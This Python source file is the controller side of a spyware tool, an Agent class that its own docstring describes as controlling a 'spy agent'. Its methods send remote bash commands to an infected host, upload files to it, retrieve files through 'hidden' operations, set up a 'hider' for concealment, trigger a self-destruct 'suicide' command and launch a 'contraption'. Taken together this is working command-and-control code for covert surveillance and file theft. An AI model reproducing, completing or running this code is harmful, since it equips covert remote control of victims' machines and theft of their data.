from connection import Connection
from command import Command
from responce import Responce
from funCode import FunCode
from status import Status
from spywareCmd import SpywareCmd
from contParams import *

"""this class is for controling 1 spy agent"""


class Agent:

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port

    def __repr__(self) -> str:
        return f"Agent(host={self.host}, port={self.port})"

    def connect(self) -> Connection:
        return Connection.connect(self.host, self.port)

    def run_bash(self, bash: str) -> tuple[Responce, str]:
        with self.connect() as conn:
            conn.send_command(Command(len(bash), FunCode.RUN_BASH, 1, bash))
            return conn.recv_full_responce()

    def write_file(self, homeFilePath, targetFileName: str) -> Responce:

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        with self.connect() as conn:
            conn.send_command(
                Command(len(fileContent), FunCode.WRITE_FILE, 0, targetFileName)
            )
            conn.send_data(fileContent)
            return conn.recv_responce_struct()

    def retrieve_file(self, fileName) -> tuple[Responce, bytes]:
        with self.connect() as conn:
            conn.send_command(
                Command(
                    0,
                    FunCode.HIDDEN_OPRATION | FunCode.HIDDEN_RETREIVE_FILE,
                    0,
                    fileName,
                )
            )
            file_data = conn.recv_file()
            res = conn.recv_responce_struct()
            return res, file_data

    def hidden_action_without_upload(self, fncode: FunCode) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD not in fncode

        with self.connect() as conn:
            conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, ""))
            results = list()
            results.append(conn.recv_bytes(Status.sizeof))
            results.append(conn.recv_bytes(Status.sizeof))
            results.append(conn.recv_bytes(Status.sizeof))
            return conn.recv_full_responce(), results

    def hidden_action_with_upload(
        self, fncode: FunCode, homeFilePath, targetFileName: str
    ) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD in fncode

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        with self.connect() as conn:
            conn.send_command(
                Command(
                    len(fileContent),
                    FunCode.HIDDEN_OPRATION | fncode,
                    0,
                    targetFileName,
                )
            )
            conn.send_data(fileContent)
            results = list()
            results.append(conn.recv_responce_struct())
            results.append(conn.recv_responce_struct())
            results.append(conn.recv_responce_struct())
            return conn.recv_full_responce(), results

    # prob redundant in future
    def hider_setup(self, hiderPath: str) -> Responce:
        with self.connect() as conn:
            conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, hiderPath))
            return conn.recv_responce_struct()

    def suicide(self):
        with self.connect() as conn:
            conn.send_command(Command(0, FunCode.SUICIDE, 0, ""))
            res = conn.recv_responce_struct()
            assert res.status == Status.SUICIDE_SUCSESS, "FAILED TO SUICIDE"
            return res

    def runContraption(self, params: ContParams, identifier: int):
        with self.connect() as conn:
            conn.send_command(Command(0, FunCode.RunContraption, identifier, ""))
            conn.send_data(bytes(params))
            res = conn.recv_responce_struct()
            return res
